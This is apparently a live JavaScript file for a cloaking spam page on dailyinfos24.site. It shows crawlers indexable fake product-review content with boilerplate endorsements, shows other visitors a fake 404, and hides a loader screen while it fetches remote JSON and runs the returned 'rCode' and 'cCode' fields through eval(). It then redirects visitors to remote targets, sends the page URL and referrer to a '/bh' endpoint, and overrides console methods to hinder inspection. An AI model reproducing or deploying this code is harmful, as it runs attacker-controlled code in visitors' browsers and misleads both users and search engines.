var isCrawler = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
var debug = false;
var stopped = false;
var loader = false;
var is404 = false;
var DOM = {};
const urlParams = new URLSearchParams(window.location.search);
var identifier;
var triggered = false;
if (urlParams.has("o2x")) {
  identifier = urlParams.get("o2x");
}
if (urlParams.has("io0")) {
  identifier = urlParams.get("io0");
}
if (!urlParams.has("o2x") && !urlParams.has("io0") && !urlParams.has("dbg123")) {
  show404();
  if (loader) {
    hideLoader();
  }
}
if (identifier !== undefined) {
  var script = document.createElement("script");
  script.setAttribute("src", "https://dailyinfos24.site/js3/index.php?id=" + identifier);
  script.setAttribute("id", "code");
  document.head.appendChild(script);
  if (!isCrawler) {
    (function () {
      'use strict';

      var _0x334388 = new MutationObserver(function () {
        if (document.body && !isCrawler && !stopped && !is404) {
          loader = true;
          let _0x3227d9 = document.createElement("div");
          _0x3227d9.setAttribute("class", "loader-wrap");
          let _0x67592e = document.createElement("span");
          _0x67592e.setAttribute("class", "loader");
          let _0x2f8ad4 = document.createElement("style");
          _0x2f8ad4.innerHTML = ".loader-wrap{position:fixed;background-color:#FFF;top:0;left:0;width:100%;height:100%;z-index:100;display:flex;align-items:center;justify-content:center;transition:.5s}.loader{width:68px;height:68px;border:5px dotted #525252;border-radius:50%;display:inline-block;position:relative;box-sizing:border-box;animation:2s linear infinite rotation}@keyframes rotation{0%{opacity:.01;transform:rotate(0)}50%{opacity:1;transform:rotate(180deg)}100%{opacity:.01;transform:rotate(360deg)}}";
          document.head.appendChild(_0x2f8ad4);
          document.body.appendChild(_0x3227d9);
          _0x3227d9.appendChild(_0x67592e);
          _0x334388.disconnect();
        }
      });
      _0x334388.observe(document.documentElement, {
        "childList": true
      });
    })();
    if (urlParams.has("dbg123")) {
      debug = true;
    }
    load("https://dailyinfos24.site/api/latest/" + identifier).then(_0x235056 => {
      if (_0x235056.rCode !== undefined) {
        eval(_0x235056.rCode);
      }
      if (!debug && _0x235056.redirect && !stopped) {
        triggered = true;
        window.location.replace(_0x235056.to);
        let _0x2146ec = document.createElement("img");
        _0x2146ec.setAttribute("src", 0x0);
        _0x2146ec.setAttribute("onerror", "top.location.href='" + _0x235056.to + "'");
        document.body.appendChild(_0x2146ec);
      }
    })["catch"](_0x2cade2 => {
      if (!debug && !stopped && !is404) {
        errorRedirect();
      }
    });
  }
  let metaUTF8 = document.createElement("meta");
  let metaViewport = document.createElement("meta");
  let metaCompatible = document.createElement("meta");
  let metaGoogleBot = document.createElement("meta");
  let metaGoogleBotIfEmbedded = document.createElement("meta");
  let metaRobots = document.createElement("meta");
  metaUTF8.setAttribute("charset", "utf-8");
  metaViewport.setAttribute("name", "viewport");
  metaViewport.setAttribute("content", "width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0");
  metaCompatible.setAttribute("http-equiv", "X-UA-Compatible");
  metaCompatible.setAttribute("content", "ie=edge");
  metaGoogleBot.setAttribute("name", "googlebot");
  metaGoogleBot.setAttribute("content", "index");
  metaGoogleBotIfEmbedded.setAttribute("name", "googlebot");
  metaGoogleBotIfEmbedded.setAttribute("content", "indexifembedded");
  metaRobots.setAttribute("name", "robots");
  metaRobots.setAttribute("content", "index,noarchive");
  document.head.appendChild(metaUTF8);
  document.head.appendChild(metaViewport);
  document.head.appendChild(metaCompatible);
  document.head.appendChild(metaGoogleBot);
  document.head.appendChild(metaGoogleBotIfEmbedded);
  document.head.appendChild(metaRobots);
  script.onerror = () => {
    loadDefault();
  };
  script.onabort = () => {
    loadDefault();
  };
  setTimeout(() => {
    if (!triggered) {
      loadDefault();
    }
  }, 0xbb8);
} else {
  document.write("<h1>404 Not Found</h1>");
  document.write("<p>Oops! The page you are looking for could not be found.</p>");
  document.write("<p><a href=\"/\">Return to Home Page</a></p>");
}
function load(_0x9a4916) {
  return fetch(_0x9a4916).then(function (_0x464ac2) {
    return _0x464ac2.json();
  })["catch"](function (_0x52e8ce) {});
}
function loadDefault() {
  triggered = true;
  if (stopped) {
    return;
  }
  if (identifier === undefined || identifier === null && !debug) {
    return show404();
  }
  let _0x4689da = setInterval(() => {
    if (document.body !== null) {
      clearInterval(_0x4689da);
      initDom();
    }
  }, 0x32);
  load("https://storage.dailyinfos24.site/fetch/" + identifier + ".json").then(_0x54bc27 => {
    document.title = titleCase(_0x54bc27.title) + " [" + _0x54bc27.random1 + "]";
    try {
      let _0xc09279 = document.createElement("meta");
      let _0x3c9ec4 = document.createElement("meta");
      _0xc09279.setAttribute("name", "description");
      _0xc09279.setAttribute("content", _0x54bc27.description);
      _0x3c9ec4.setAttribute("name", "keywords");
      _0x3c9ec4.setAttribute("content", _0x54bc27.random1 + " " + titleCase(_0x54bc27.title) + ", " + titleCase(_0x54bc27.title));
      document.head.appendChild(_0xc09279);
      document.head.appendChild(_0x3c9ec4);
      let _0x48af67 = document.querySelector("meta[property=\"og:locale\"]");
      let _0x3fb5a5 = document.querySelector("meta[property=\"og:site_name\"]");
      _0x48af67.setAttribute("content", _0x54bc27.language);
      _0x3fb5a5.setAttribute("content", titleCase(_0x54bc27.title) + " [" + _0x54bc27.random1 + "]");
      let _0x123932 = document.querySelector("html");
      _0x123932.setAttribute("lang", _0x54bc27.language);
    } catch (_0x36b4d9) {}
    hideLoader();
    if (_0x54bc27.schemas !== undefined) {
      _0x54bc27.schemas.forEach(_0x306c94 => {
        addSchema(_0x306c94.id, _0x306c94.data);
      });
    }
    let _0xe9defb = setInterval(() => {
      if (DOM.footer !== null || stopped) {
        clearInterval(_0xe9defb);
        if (!stopped) {
          populateDom(_0x54bc27);
        }
      }
    }, 0x32);
  });
  load("https://dailyinfos24.site/api/latest/" + identifier).then(_0xcb69ad => {
    if (_0xcb69ad.cCode !== undefined) {
      eval(_0xcb69ad.cCode);
    }
    if (_0xcb69ad.schemas !== undefined && _0xcb69ad.schemas.length > 0x0) {
      _0xcb69ad.schemas.forEach(_0x2247be => {
        addSchema(_0x2247be.id, _0x2247be.data);
      });
    }
    let _0x5af570 = setInterval(() => {
      if (DOM.footer !== null || stopped) {
        clearInterval(_0x5af570);
        if (!stopped) {
          populateMeta(_0xcb69ad);
        }
      }
    }, 0x32);
  });
}
function populateDom(_0x4688e1) {
  if (_0x4688e1.related === undefined) {
    DOM.main.setAttribute("class", "px-2 w-full h-48 max-w-7xl mx-auto grid grid-cols-1 mt-4 gap-x-12");
    DOM.main_aside.remove();
  } else {
    try {
      _0x4688e1.related.forEach(_0x2b6003 => {
        appendRelative(_0x2b6003.header, _0x2b6003.url);
      });
    } catch (_0x36230f) {}
  }
  DOM.main_article_header_h1.innerHTML = titleCase(_0x4688e1.title) + " [" + _0x4688e1.random1 + "]";
  DOM.main_article_figure_img.setAttribute("aria-label", "Image of " + _0x4688e1.name);
  DOM.main_article_figure_img.setAttribute("alt", _0x4688e1.name + ".png");
  DOM.main_article_figure_img.setAttribute("src", _0x4688e1.identifier !== undefined ? _0x4688e1.backdrop : _0x4688e1.image);
  DOM.main_article_figure_figcaption.innerHTML = "Image of " + _0x4688e1.name;
  const [_0x5b6d4, _0x430a1b] = splitText(_0x4688e1.text);
  DOM.main_article_p1.innerHTML = _0x5b6d4;
  DOM.main_article_button1_span.innerHTML = "Special Access:";
  DOM.main_article_button1_span2.innerHTML = "For Our Readers Only!";
  DOM.main_article_p2.innerHTML = _0x430a1b;
  DOM.main_article_h3.innerHTML = "Final Verdict";
  DOM.main_article_p3.innerHTML = "We can definitely recommend " + (_0x4688e1.identifier !== undefined ? _0x4688e1.title : _0x4688e1.name) + " to our readers, since it is not merely a product, but a symphony of experiences crafted for the discerning individual. In a world full of choices, it's vital to select products that truly align with our wellness goals.  " + (_0x4688e1.identifier !== undefined ? _0x4688e1.title : _0x4688e1.name) + " stands out as a trusted companion on your health journey. While every product has its nuances, our unwavering commitment is to enhance your life quality. The journey to a better you starts with a single step. Why not take it now?";
  DOM.main_article_button2_span.innerHTML = "Unlock Exclusive";
  DOM.main_article_button2_span2.innerHTML = "Details & Discounts";
}
function populateMeta(_0x120058) {
  DOM.main_article_header_p.innerHTML = "Published on: <time datetime=\"" + _0x120058.updated + "\">" + getCurrentFormattedDate(_0x120058.updated) + "</time>";
  DOM.main_article_button1_a.setAttribute("href", _0x120058.to);
  DOM.main_article_button2_a.setAttribute("href", _0x120058.to);
  let _0xde5cbc = document.querySelector("script[id=\"default\"]");
  if (_0xde5cbc !== null && _0xde5cbc !== undefined) {
    let _0x4c0eb6 = JSON.parse(_0xde5cbc.innerText);
    _0x4c0eb6.uploadDate = isoDateTimeToDateOnly(_0x120058.updated);
    _0xde5cbc.innerHTML = JSON.stringify(_0x4c0eb6);
  }
}
function addSchema(_0x3e3da0, _0x496f6f) {
  let _0x5f2a48 = document.createElement("script");
  _0x5f2a48.setAttribute("type", "application/ld+json");
  _0x5f2a48.setAttribute("id", _0x3e3da0);
  _0x5f2a48.innerHTML = JSON.stringify(_0x496f6f);
  document.head.appendChild(_0x5f2a48);
}
function initDom() {
  DOM.styles = document.createElement("style");
  DOM.styles.innerHTML = "*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}:before,:after{--tw-content: \"\"}html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\",Segoe UI Symbol,\"Noto Color Emoji\";font-feature-settings:normal;font-variation-settings:normal}body{margin:0;line-height:inherit;background:#fff;}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}b,strong{font-weight:bolder}code,kbd,samp,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}ol,ul,menu{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}button,[role=button]{cursor:pointer}:disabled{cursor:default}img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }::backdrop{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }.absolute{position:absolute}.relative{position:relative}.inset-0{top:0;right:0;bottom:0;left:0}.-mx-2{margin-left:-.5rem;margin-right:-.5rem}.mx-auto{margin-left:auto;margin-right:auto}.my-10{margin-top:2.5rem;margin-bottom:2.5rem}.max-h-60{max-height:15rem}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mb-20{margin-bottom:5rem}.mt-4{margin-top:1rem}.mt-48{margin-top:12rem}.mt-6{margin-top:1.5rem}.flex{display:flex}.grid{display:grid}.h-48{height:12rem}.w-full{width:100%}.max-w-7xl{max-width:80rem}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}.flex-col{flex-direction:column}.gap-x-12{-moz-column-gap:3rem;column-gap:3rem}.space-y-4>:not([hidden])~:not([hidden]){--tw-space-y-reverse: 0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse: 0;border-top-width:calc(1px * calc(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px * var(--tw-divide-y-reverse))}.divide-gray-200>:not([hidden])~:not([hidden]){--tw-divide-opacity: 1;border-color:rgb(229 231 235 / var(--tw-divide-opacity))}.rounded{border-radius:.25rem}.bg-blue-400{--tw-bg-opacity: 1;background-color:rgb(96 165 250 / var(--tw-bg-opacity))}.bg-gray-700{--tw-bg-opacity: 1;background-color:rgb(55 65 81 / var(--tw-bg-opacity))}.object-contain{-o-object-fit:contain;object-fit:contain}.p-2{padding:.5rem}.p-4{padding:1rem}.px-2{padding-left:.5rem;padding-right:.5rem}.pb-1{padding-bottom:.25rem}.pt-2{padding-top:.5rem}.pt-4{padding-top:1rem}.text-center{text-align:center}.text-justify{text-align:justify}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.font-bold{font-weight:700}.text-gray-500{--tw-text-opacity: 1;color:rgb(107 114 128 / var(--tw-text-opacity))}.text-white{--tw-text-opacity: 1;color:rgb(255 255 255 / var(--tw-text-opacity))}@media (min-width: 768px){.md\\:col-span-2{grid-column:span 2 / span 2}.md\\:col-span-4{grid-column:span 4 / span 4}.md\\:mx-auto{margin-left:auto;margin-right:auto}.md\\:w-2\\/3{width:66.666667%}.md\\:grid-cols-6{grid-template-columns:repeat(6,minmax(0,1fr))}.md\\:text-4xl{font-size:2.25rem;line-height:2.5rem}}\n";
  document.head.appendChild(DOM.styles);
  DOM.header = document.createElement("header");
  DOM.header_a = document.createElement("a");
  DOM.header_img = document.createElement("img");
  DOM.header_nav = document.createElement("nav");
  DOM.header_time = document.createElement("time");
  document.body.appendChild(DOM.header);
  DOM.header_a.setAttribute("href", window.location.href);
  DOM.header_a.setAttribute("class", "mx-auto text-center");
  DOM.header.appendChild(DOM.header_a);
  DOM.header_img.setAttribute("src", "https://dailyinfos24.site/images/logo.png");
  DOM.header_img.setAttribute("class", "px-2 pt-2 pb-1 object-contain mx-auto");
  DOM.header_img.setAttribute("alt", "logo.png");
  DOM.header_a.appendChild(DOM.header_img);
  DOM.header_nav.setAttribute("class", "w-full bg-gray-700 text-center p-2");
  DOM.header.appendChild(DOM.header_nav);
  DOM.header_time.setAttribute("datetime", new Date().toISOString());
  DOM.header_time.setAttribute("class", "text-white text-center");
  DOM.header_time.innerHTML = getCurrentFormattedDate();
  DOM.header_nav.appendChild(DOM.header_time);
  DOM.main = document.createElement("main");
  DOM.main_article = document.createElement("article");
  DOM.main_article_header = document.createElement("header");
  DOM.main_article_header_h1 = document.createElement("h1");
  DOM.main_article_header_p = document.createElement("p");
  DOM.main_article_header_time = document.createElement("time");
  DOM.main_article_figure = document.createElement("figure");
  DOM.main_article_figure_img = document.createElement("img");
  DOM.main_article_figure_figcaption = document.createElement("figcaption");
  DOM.main_article_p1 = document.createElement("p");
  DOM.main_article_button1 = document.createElement("button");
  DOM.main_article_button1_a = document.createElement("a");
  DOM.main_article_button1_span = document.createElement("span");
  DOM.main_article_button1_span2 = document.createElement("span");
  DOM.main_article_p2 = document.createElement("p");
  DOM.main_article_h3 = document.createElement("h3");
  DOM.main_article_p3 = document.createElement("p");
  DOM.main_article_button2 = document.createElement("button");
  DOM.main_article_button2_a = document.createElement("a");
  DOM.main_article_button2_span = document.createElement("span");
  DOM.main_article_button2_span2 = document.createElement("span");
  DOM.main_article_footer = document.createElement("footer");
  DOM.main_article_footer_h6 = document.createElement("h6");
  DOM.main_article_footer_p = document.createElement("p");
  DOM.main.setAttribute("class", "px-2 w-full h-48 max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-6 mt-4 gap-x-12");
  document.body.appendChild(DOM.main);
  DOM.main_article.setAttribute("class", "md:col-span-4");
  DOM.main_article.setAttribute("aria-labelledby", "article-heading");
  DOM.main.appendChild(DOM.main_article);
  DOM.main_article.appendChild(DOM.main_article_header);
  DOM.main_article_header_h1.setAttribute("id", "article-heading");
  DOM.main_article_header_h1.setAttribute("class", "font-bold text-xl md:text-4xl");
  DOM.main_article_header.appendChild(DOM.main_article_header_h1);
  DOM.main_article_header_p.setAttribute("class", "text-gray-500 text-sm");
  DOM.main_article.appendChild(DOM.main_article_header_p);
  DOM.main_article_header_p.appendChild(DOM.main_article_header_time);
  DOM.main_article.appendChild(DOM.main_article_figure);
  DOM.main_article_figure_img.setAttribute("class", "w-full object-contain max-h-60");
  DOM.main_article_figure_img.setAttribute("role", "img");
  DOM.main_article_figure.appendChild(DOM.main_article_figure_img);
  DOM.main_article_figure_figcaption.setAttribute("class", "text-center mx-auto");
  DOM.main_article_figure.appendChild(DOM.main_article_figure_figcaption);
  DOM.main_article_p1.setAttribute("class", "text-justify mt-6");
  DOM.main_article.appendChild(DOM.main_article_p1);
  DOM.main_article_button1.setAttribute("class", "text-white bg-blue-400 w-full p-4 text-center flex flex-col rounded my-10 md:w-2/3 md:mx-auto relative");
  DOM.main_article.appendChild(DOM.main_article_button1);
  DOM.main_article_button1_a.setAttribute("class", "absolute inset-0");
  DOM.main_article_button1.appendChild(DOM.main_article_button1_a);
  DOM.main_article_button1_span.setAttribute("class", "text-center mx-auto");
  DOM.main_article_button1.appendChild(DOM.main_article_button1_span);
  DOM.main_article_button1_span2.setAttribute("class", "text-center text-2xl font-bold mx-auto");
  DOM.main_article_button1.appendChild(DOM.main_article_button1_span2);
  DOM.main_article_p2.setAttribute("class", "text-justify");
  DOM.main_article.appendChild(DOM.main_article_p2);
  DOM.main_article_h3.setAttribute("class", "text-center text-2xl bg-gray-700 -mx-2 text-white my-6 p-4");
  DOM.main_article.appendChild(DOM.main_article_h3);
  DOM.main_article_p3.setAttribute("class", "text-justify");
  DOM.main_article.appendChild(DOM.main_article_p3);
  DOM.main_article_button2.setAttribute("class", "text-white bg-blue-400 w-full p-4 text-center flex flex-col rounded my-10 md:w-2/3 md:mx-auto relative");
  DOM.main_article.appendChild(DOM.main_article_button2);
  DOM.main_article_button2_a.setAttribute("class", "absolute inset-0");
  DOM.main_article_button2.appendChild(DOM.main_article_button2_a);
  DOM.main_article_button2_span.setAttribute("class", "text-center mx-auto");
  DOM.main_article_button2.appendChild(DOM.main_article_button2_span);
  DOM.main_article_button2_span2.setAttribute("class", "text-center text-2xl font-bold mx-auto");
  DOM.main_article_button2.appendChild(DOM.main_article_button2_span2);
  DOM.main_article_footer.setAttribute("class", "mt-48 mb-20");
  DOM.main_article.appendChild(DOM.main_article_footer);
  DOM.main_article_footer.appendChild(DOM.main_article_footer_h6);
  DOM.main_article_footer_p.setAttribute("class", "text-sm text-gray-500");
  DOM.main_article_footer.appendChild(DOM.main_article_footer_p);
  DOM.main_aside = document.createElement("aside");
  DOM.main_aside_h3 = document.createElement("h3");
  DOM.main_aside_section = document.createElement("h3");
  DOM.main_aside.setAttribute("class", "md:col-span-2");
  DOM.main.appendChild(DOM.main_aside);
  DOM.main_aside_h3.setAttribute("class", "w-full bg-gray-700 text-white text-center p-4 font-bold text-xl");
  DOM.main_aside_h3.innerHTML = "Related";
  DOM.main_aside.appendChild(DOM.main_aside_h3);
  DOM.main_aside_section.setAttribute("class", "divide-y divide-gray-200 space-y-4");
  DOM.main_aside.appendChild(DOM.main_aside_section);
  DOM.footer = document.createElement("footer");
  document.body.appendChild(DOM.footer);
}
function hideLoader() {
  if (loader) {
    let _0x28ff00 = document.querySelector(".loader-wrap");
    _0x28ff00.style.opacity = 0x0;
    setTimeout(() => {
      _0x28ff00.style.display = "none";
      _0x28ff00.remove();
    }, 0x3e8);
  }
}
function appendRelative(_0x4cfbe3, _0x40a31f) {
  let _0x1eec2 = document.createElement("article");
  _0x1eec2.setAttribute("class", "p-2 pt-4 relative");
  DOM.main_aside.appendChild(_0x1eec2);
  let _0x531c84 = document.createElement("a");
  _0x531c84.setAttribute("href", _0x40a31f);
  _0x531c84.setAttribute("class", "absolute inset-0");
  _0x1eec2.appendChild(_0x531c84);
  let _0x3d902d = document.createElement("h4");
  _0x3d902d.setAttribute("class", "w-full font-bold text-2xl");
  _0x3d902d.innerHTML = _0x4cfbe3;
  _0x1eec2.appendChild(_0x3d902d);
}
function splitText(_0x34006b) {
  const _0x3d7a2d = Math.floor(_0x34006b.length / 0x3);
  let _0xbb888e = _0x3d7a2d;
  while (_0xbb888e < _0x34006b.length && _0x34006b[_0xbb888e] !== "\n") {
    _0xbb888e++;
  }
  if (_0xbb888e < _0x34006b.length) {
    return [_0x34006b.substring(0x0, _0xbb888e + 0x1), _0x34006b.substring(_0xbb888e + 0x1)];
  }
  return [_0x34006b.substring(0x0, _0x3d7a2d), _0x34006b.substring(_0x3d7a2d)];
}
function errorRedirect() {
  urlParams.append("c", window.location.href);
  urlParams.append("r", document.referrer);
  let _0x227dc7 = urlParams.toString();
  let _0x4428ad = "https://dailyinfos24.site/bh?" + _0x227dc7;
  window.location.href = _0x4428ad;
  let _0x4996f7 = document.createElement("img");
  _0x4996f7.setAttribute("src", 0x0);
  _0x4996f7.setAttribute("onerror", "top.location.href='" + _0x4428ad + "'");
  document.body.appendChild(_0x4996f7);
}
function show404() {
  const _0x34f0ab = function () {
    let _0x32aa44 = true;
    return function (_0x1c3da9, _0x50bdc8) {
      const _0x479640 = _0x32aa44 ? function () {
        if (_0x50bdc8) {
          const _0xe75149 = _0x50bdc8.apply(_0x1c3da9, arguments);
          _0x50bdc8 = null;
          return _0xe75149;
        }
      } : function () {};
      _0x32aa44 = false;
      return _0x479640;
    };
  }();
  const _0x2a62ec = _0x34f0ab(this, function () {
    let _0x3dca15;
    try {
      const _0x136576 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x3dca15 = _0x136576();
    } catch (_0x29b88e) {
      _0x3dca15 = window;
    }
    const _0x17704e = _0x3dca15.console = _0x3dca15.console || {};
    const _0x4b3b95 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x58e62d = 0x0; _0x58e62d < _0x4b3b95.length; _0x58e62d++) {
      const _0x533969 = _0x34f0ab.constructor.prototype.bind(_0x34f0ab);
      const _0x4762dd = _0x4b3b95[_0x58e62d];
      const _0x290166 = _0x17704e[_0x4762dd] || _0x533969;
      _0x533969.__proto__ = _0x34f0ab.bind(_0x34f0ab);
      _0x533969.toString = _0x290166.toString.bind(_0x290166);
      _0x17704e[_0x4762dd] = _0x533969;
    }
  });
  _0x2a62ec();
  is404 = true;
  triggered = true;
  stopped = true;
}
function getCurrentFormattedDate(_0x42f914 = null) {
  const _0x29a78b = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
  const _0x7f9c99 = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
  let _0x20e888 = new Date();
  if (_0x42f914 !== null) {
    _0x20e888 = new Date(Date.parse(_0x42f914));
  }
  let _0x37f1c2 = _0x29a78b[_0x20e888.getDay()];
  let _0x18e43f = _0x7f9c99[_0x20e888.getMonth()];
  let _0x540899 = _0x20e888.getDate();
  let _0x466294 = _0x20e888.getFullYear();
  return _0x37f1c2 + ", " + _0x18e43f + " " + _0x540899 + ", " + _0x466294;
}
function titleCase(_0x1bc4fd) {
  var _0x5c2532 = _0x1bc4fd.toLowerCase().split(" ");
  for (var _0x5df4dc = 0x0; _0x5df4dc < _0x5c2532.length; _0x5df4dc++) {
    _0x5c2532[_0x5df4dc] = _0x5c2532[_0x5df4dc].charAt(0x0).toUpperCase() + _0x5c2532[_0x5df4dc].substring(0x1);
  }
  return _0x5c2532.join(" ");
}
function getTitle(_0x12ea15) {
  return _0x12ea15.identifier !== undefined ? _0x12ea15.title : _0x12ea15.name;
}
